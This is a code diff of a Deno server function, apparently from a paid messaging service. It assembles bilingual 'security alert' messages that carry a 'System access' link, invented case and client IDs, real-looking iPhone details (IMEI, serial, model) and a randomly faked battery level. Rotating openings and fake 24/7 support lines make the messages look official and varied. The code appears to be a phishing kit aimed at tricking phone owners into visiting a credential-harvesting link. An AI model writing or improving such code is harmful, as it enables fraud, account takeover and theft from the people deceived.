@@ -240,97 +240,76 @@ Deno.serve(async (req) => {
       }
     }
 
-    // Check if message already has full structure (to avoid duplication)
-    const hasStructure = customSection.includes('ID de caso:') || customSection.includes('Case ID:') || customSection.includes('Caso:');
+    // Always add URL right after custom section (if not already present)
+    const linkLabel = queuedMessage.language === 'spanish' ? '🔗 Acceso al sistema' : '🔗 System access';
+    if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
+      customSection += `\n\n${linkLabel}: ${queuedMessage.processes.url}`;
+    }
 
-    if (hasStructure) {
-      // Already fully structured - just add URL if missing
-      const linkLabel = queuedMessage.language === 'spanish' ? '🔗 Acceso al sistema' : '🔗 System access';
-      if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
-        // Find where to insert the URL (after the first paragraph/section, before the IDs)
-        const idMarker = queuedMessage.language === 'spanish' ? '\n\nID de caso:' : '\n\nCase ID:';
-        const casoMarker = '\n\nCaso:';
-        let insertPoint = customSection.indexOf(idMarker);
-        if (insertPoint === -1) insertPoint = customSection.indexOf(casoMarker);
-        
-        if (insertPoint > 0) {
-          customSection = customSection.slice(0, insertPoint) + `\n\n${linkLabel}: ${queuedMessage.processes.url}` + customSection.slice(insertPoint);
-        } else {
-          customSection += `\n\n${linkLabel}: ${queuedMessage.processes.url}`;
-        }
-      }
-      queuedMessage.message_content = customSection;
+    // Generate IDs and battery
+    const now = new Date();
+    const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
+    const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
+    const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
+    const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
+
+    const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
+
+    if (queuedMessage.language === 'spanish') {
+      const openingsES = [
+        '🛡️ Alerta de seguridad del sistema',
+        '🔐 Notificación de seguridad',
+        '🔒 Sistema de protección activado',
+      ];
+      const statusPhrasesES = [
+        'Detalles del dispositivo:',
+        'Información del equipo:',
+        'Datos técnicos:',
+      ];
+      const deviceSectionsES = [
+        `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
+        `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${processColor} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
+        `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
+      ];
+      const helpPhrasesES = [
+        '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
+        '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
+        '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
+      ];
+      const closingsES = [
+        'Servicio automatizado – Atención disponible 24 h',
+        'Sistema automático – Soporte activo 24/7',
+        'Monitoreo continuo – Asistencia permanente',
+      ];
+
+      queuedMessage.message_content = `${random(openingsES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}\n\n${random(helpPhrasesES)}\n${random(closingsES)}`;
     } else {
-      // Simple template or custom text - wrap with structure
-      const linkLabel = queuedMessage.language === 'spanish' ? '🔗 Acceso al sistema' : '🔗 System access';
-      if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
-        customSection = `${customSection}\n\n${linkLabel}: ${queuedMessage.processes.url}`.trim();
-      }
+      const openingsEN = [
+        '🛡️ System security alert',
+        '🔐 Security notification',
+        '🔒 Protection system activated',
+      ];
+      const statusPhrasesEN = [
+        'Device details:',
+        'Equipment information:',
+        'Technical data:',
+      ];
+      const deviceSectionsEN = [
+        `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
+        `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
+      ];
+      const helpPhrasesEN = [
+        'Need help? Write *Menu* for technical assistance 👨‍💻',
+        'Require support? Reply *Menu* for specialized help 🔧',
+        'Looking for assistance? Send *Menu* to contact support 👩‍💻',
+      ];
+      const closingsEN = [
+        'Automated service – 24 h assistance available',
+        'Automatic system – 24/7 active support',
+        'Continuous monitoring – Permanent assistance',
+      ];
 
-      const now = new Date();
-      const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
-      const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
-      const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
-      const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
-
-      const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
-
-      if (queuedMessage.language === 'spanish') {
-        const openingsES = [
-          '🛡️ Alerta de seguridad del sistema',
-          '🔐 Notificación de seguridad',
-          '🔒 Sistema de protección activado',
-        ];
-        const statusPhrasesES = [
-          'Detalles del dispositivo:',
-          'Información del equipo:',
-          'Datos técnicos:',
-        ];
-        const deviceSectionsES = [
-          `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
-          `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${processColor} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
-          `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
-        ];
-        const helpPhrasesES = [
-          '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
-          '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
-          '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
-        ];
-        const closingsES = [
-          'Servicio automatizado – Atención disponible 24 h',
-          'Sistema automático – Soporte activo 24/7',
-          'Monitoreo continuo – Asistencia permanente',
-        ];
-
-        queuedMessage.message_content = `${random(openingsES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}\n\n${random(helpPhrasesES)}\n${random(closingsES)}`;
-      } else {
-        const openingsEN = [
-          '🛡️ System security alert',
-          '🔐 Security notification',
-          '🔒 Protection system activated',
-        ];
-        const statusPhrasesEN = [
-          'Device details:',
-          'Equipment information:',
-          'Technical data:',
-        ];
-        const deviceSectionsEN = [
-          `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
-          `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${processColor} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
-        ];
-        const helpPhrasesEN = [
-          'Need help? Write *Menu* for technical assistance 👨‍💻',
-          'Require support? Reply *Menu* for specialized help 🔧',
-          'Looking for assistance? Send *Menu* to contact support 👩‍💻',
-        ];
-        const closingsEN = [
-          'Automated service – 24 h assistance available',
-          'Automatic system – 24/7 active support',
-          'Continuous monitoring – Permanent assistance',
-        ];
-
-        queuedMessage.message_content = `${random(openingsEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}\n\n${random(helpPhrasesEN)}\n${random(closingsEN)}`;
-      }
+      queuedMessage.message_content = `${random(openingsEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}\n\n${random(helpPhrasesEN)}\n${random(closingsEN)}`;
     }
 
     // Check if user has credits
